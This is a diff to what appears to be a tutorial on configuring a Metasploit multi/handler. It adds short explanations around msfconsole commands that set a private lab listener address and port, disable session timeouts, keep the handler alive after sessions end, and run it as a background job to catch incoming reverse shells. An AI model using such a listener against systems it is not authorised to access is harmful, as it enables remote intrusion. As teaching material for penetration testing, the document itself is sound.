@@ -37,10 +37,25 @@ msf exploit(multi/handler) > set lhost 10.0.2.6
 lhost => 10.0.2.6
 msf exploit(multi/handler) > set lport 80
 lport => 80
+```
+
+Ensure there's no timeout limit for the session's communication.
+
+```
 msf exploit(multi/handler) > set SessionCommunicationTimeout 0
 SessionCommunicationTimeout => 0
+```
+
+Setting this option that even if the session has been terminated the shell launcher will stay active. This saves time from setting it up again.
+
+```
 msf exploit(multi/handler) > set ExitOnSession false
 ExitOnSession => false
+```
+
+Launch the shell handler to listening incoming sessions.
+
+```
 msf exploit(multi/handler) > exploit -j
 [*] Exploit running as background job 1.
 [*] Exploit completed, but no session was created.
